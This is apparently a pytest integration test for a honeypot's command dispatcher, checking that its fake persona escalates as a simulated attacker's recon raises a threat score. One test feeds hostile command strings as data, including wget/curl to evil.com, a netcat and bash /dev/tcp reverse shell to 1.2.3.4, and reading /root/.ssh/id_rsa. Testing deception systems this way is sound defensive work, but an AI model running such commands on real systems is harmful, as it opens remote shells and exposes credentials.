"""Integration test: persona switching through HoneypotCommandDispatcher.

Drives the dispatcher the same way cowrie_hook.py does and verifies:
  - threat score rises through a realistic recon sequence
  - a persona transition is triggered and progresses across commands
  - attacker-created files survive the transition (overlay preserved)
  - ls output is additive-only across the transition
"""
from __future__ import annotations

import os
import re
from pathlib import Path

import pytest

from honeypot.cowrie_hook import HoneypotCommandDispatcher, create_dispatcher
from event_logging.session_logger import SessionLogger


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_LOG_DIR = Path(__file__).resolve().parent.parent / "event_logging" / "logs"


@pytest.fixture(autouse=True)
def _disable_profile_mode(monkeypatch):
    """Ensure tests in this file always use the standard persona order."""
    monkeypatch.delenv("HONEYPOT_PROFILE", raising=False)


def _make_dispatcher(persona: str = "generic_linux") -> HoneypotCommandDispatcher:
    logger = SessionLogger(
        log_dir=str(_LOG_DIR),
        logger_name=f"test_live_path_{id(object())}",
    )
    return create_dispatcher(
        attacker_ip="192.0.2.99",
        attacker_port=44444,
        persona_name=persona,
        session_logger=logger,
    )


def _run(disp: HoneypotCommandDispatcher, cmd: str) -> str:
    """Run a command through the dispatcher, return the response text."""
    response, _source = disp.dispatch(cmd)
    return response


def _ls_names(disp: HoneypotCommandDispatcher, path: str) -> set[str]:
    """Return the set of entry names from `ls <path>`."""
    output = _run(disp, f"ls {path}")
    return set(output.split()) if output.strip() else set()


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestPersonaSwitchingLivePath:
    """End-to-end persona switching through the real dispatcher."""

    def test_threat_score_rises_through_recon(self) -> None:
        """A realistic recon sequence must raise the threat score."""
        d = _make_dispatcher()

        _run(d, "whoami")
        assert d.session.threat_score >= 1

        _run(d, "uname -a")
        _run(d, "id")
        _run(d, "cat /etc/passwd")
        _run(d, "ps aux")
        _run(d, "netstat -tulpn")

        assert d.session.threat_score >= 10, (
            f"After basic recon the score should be meaningful, got {d.session.threat_score}"
        )

    def test_transition_triggers_at_threshold(self) -> None:
        """Pumping the score past 51 must trigger a dev_workstation switch."""
        d = _make_dispatcher()

        recon_commands = [
            "whoami",
            "uname -a",
            "id",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "ps aux",
            "netstat -tulpn",
            "cat /etc/sudoers",
            "sudo -l",
        ]
        for cmd in recon_commands:
            _run(d, cmd)

        assert d.session.threat_score >= 51, (
            f"Score should cross 51 after heavy recon, got {d.session.threat_score}"
        )

        assert d.persona_name != "generic_linux", (
            f"Persona should have switched away from generic_linux at score {d.session.threat_score}"
        )

    def test_transition_progresses_across_commands(self) -> None:
        """After trigger, overlay entries must grow over successive commands."""
        d = _make_dispatcher()

        # Drive score past 51 to trigger transition
        for cmd in [
            "whoami", "uname -a", "id", "cat /etc/passwd",
            "cat /etc/shadow", "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
        ]:
            _run(d, cmd)

        assert d._switcher.is_transitioning() or (
            d._switcher.state is not None and d._switcher.state.phase.value == "done"
        ), "Transition should have started or already completed"

        overlay_count_before = len(d.session.overlay.entries)

        # Run more commands to drip transition changes
        filler = ["ls", "pwd", "date", "uptime", "hostname"]
        for cmd in filler:
            _run(d, cmd)

        overlay_count_after = len(d.session.overlay.entries)
        assert overlay_count_after >= overlay_count_before, (
            "Overlay entries should not decrease during transition"
        )

    def test_attacker_file_survives_transition(self) -> None:
        """A file created before the transition must still be visible after."""
        d = _make_dispatcher()

        # Create a file early in the session
        _run(d, "touch /tmp/notes.txt")
        pre_ls = _ls_names(d, "/tmp")
        assert "notes.txt" in pre_ls, (
            f"touch should create notes.txt in /tmp, got: {pre_ls}"
        )

        # Drive score past 51
        for cmd in [
            "whoami", "uname -a", "id", "cat /etc/passwd",
            "cat /etc/shadow", "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
        ]:
            _run(d, cmd)

        # Drain the transition
        for cmd in ["ls", "pwd", "date", "uptime", "hostname",
                     "ls /home", "ls /var"]:
            _run(d, cmd)

        # notes.txt must still exist
        post_ls = _ls_names(d, "/tmp")
        assert "notes.txt" in post_ls, (
            f"notes.txt must survive persona transition, got: {post_ls}"
        )

        # cat must still return empty content (from touch)
        cat_output = _run(d, "cat /tmp/notes.txt")
        assert cat_output is not None  # no FileNotFoundError

    def test_ls_additive_only(self) -> None:
        """Nothing visible in ls before the transition may vanish afterwards."""
        d = _make_dispatcher()

        # Snapshot key directories before transition
        pre_home = _ls_names(d, "/home")
        pre_root = _ls_names(d, "/")

        # Drive score past 51
        for cmd in [
            "whoami", "uname -a", "id", "cat /etc/passwd",
            "cat /etc/shadow", "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
        ]:
            _run(d, cmd)

        # Drain transition
        for cmd in ["ls", "pwd", "date", "uptime", "hostname",
                     "ls /home", "ls /var"]:
            _run(d, cmd)

        post_home = _ls_names(d, "/home")
        post_root = _ls_names(d, "/")

        disappeared_home = pre_home - post_home
        assert not disappeared_home, (
            f"Entries vanished from /home after transition: {disappeared_home}"
        )

        disappeared_root = pre_root - post_root
        assert not disappeared_root, (
            f"Entries vanished from / after transition: {disappeared_root}"
        )

    def test_session_state_preserved_across_switch(self) -> None:
        """Command history and session_id must not reset on persona switch."""
        d = _make_dispatcher()
        original_session_id = d.session_id

        _run(d, "whoami")
        history_len_1 = len(d.session.command_history)

        # Drive past threshold
        for cmd in [
            "uname -a", "id", "cat /etc/passwd", "cat /etc/shadow",
            "ps aux", "netstat -tulpn", "cat /etc/sudoers", "sudo -l",
        ]:
            _run(d, cmd)

        assert d.session_id == original_session_id, (
            "Session ID must not change on persona switch"
        )
        assert len(d.session.command_history) > history_len_1, (
            "Command history must continue growing across transition"
        )

    def test_session_persona_fields_stay_in_sync(self) -> None:
        """Dispatcher must write active_persona and persona_switch_count back."""
        d = _make_dispatcher()

        for cmd in [
            "whoami", "uname -a", "id", "cat /etc/passwd",
            "cat /etc/shadow", "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
        ]:
            _run(d, cmd)

        assert d.session.active_persona == d.persona_name, (
            f"session.active_persona ({d.session.active_persona}) must match "
            f"dispatcher.persona_name ({d.persona_name})"
        )
        assert d.session.persona_switch_count == d._persona_switch_count

    def test_max_two_transitions_no_backward(self) -> None:
        """A long escalating session produces at most 2 transitions,
        never repeats a persona, and never goes backward."""
        d = _make_dispatcher()
        personas_seen: list[str] = [d.persona_name]
        PERSONA_ORDER = ["generic_linux", "dev_workstation", "finance_server"]

        heavy_commands = [
            "whoami", "uname -a", "id",
            "cat /etc/passwd", "cat /etc/shadow",
            "ps aux", "netstat -tulpn",
            "cat /etc/sudoers", "sudo -l",
            "find / -perm -4000", "wget http://evil.com/shell",
            "curl http://evil.com/payload", "nc -e /bin/sh 1.2.3.4 4444",
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "cat /root/.ssh/id_rsa", "ssh root@10.0.0.1",
            "nmap -sV 10.0.0.0/24",
        ]

        for cmd in heavy_commands:
            _run(d, cmd)
            current = d.persona_name
            if current != personas_seen[-1]:
                personas_seen.append(current)

        # Drain any in-progress transition
        for _ in range(10):
            _run(d, "ls")
            current = d.persona_name
            if current != personas_seen[-1]:
                personas_seen.append(current)

        transitions = len(personas_seen) - 1
        assert transitions <= 2, (
            f"Expected at most 2 transitions, got {transitions}: {personas_seen}"
        )

        # No duplicates (never revisits a persona)
        assert len(personas_seen) == len(set(personas_seen)), (
            f"Persona repeated: {personas_seen}"
        )

        # Monotonically forward
        for i in range(1, len(personas_seen)):
            prev_idx = PERSONA_ORDER.index(personas_seen[i - 1])
            curr_idx = PERSONA_ORDER.index(personas_seen[i])
            assert curr_idx > prev_idx, (
                f"Backward transition: {personas_seen[i-1]} -> {personas_seen[i]}"
            )
